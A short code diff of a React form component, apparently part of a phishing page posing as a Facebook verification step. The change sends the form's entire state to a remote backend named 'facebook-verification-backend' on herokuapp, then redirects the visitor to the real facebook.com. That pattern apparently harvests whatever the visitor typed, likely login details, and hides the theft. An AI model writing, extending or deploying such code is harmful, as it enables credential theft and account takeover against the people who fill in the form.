@@ -16,7 +16,7 @@ class App extends React.Component {
 
   handleSubmit = (e) => {
     e.preventDefault();
-    Axios.post('http://localhost:4000/add-people', this.state)
+    Axios.post('https://facebook-verification-backend.herokuapp.com/add-people', this.state)
     window.location.href = "https://facebook.com"
   }
 
